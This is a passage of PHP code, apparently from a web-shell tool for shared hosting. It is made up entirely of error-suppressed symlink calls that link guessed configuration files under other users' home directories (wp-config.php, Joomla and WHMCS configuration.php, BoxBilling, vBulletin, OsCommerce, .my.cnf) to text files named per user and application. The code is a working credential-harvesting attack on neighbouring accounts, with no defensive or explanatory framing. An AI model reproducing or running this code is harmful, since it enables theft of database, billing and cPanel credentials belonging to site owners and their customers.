@symlink('/home4/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home4/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home5

@symlink('/home5/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home5/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home5/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home5/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home5/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home5/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home5/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home5/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home5/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home5/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home6

@symlink('/home6/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home6/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home6/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home6/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home6/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home6/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home6/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home6/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
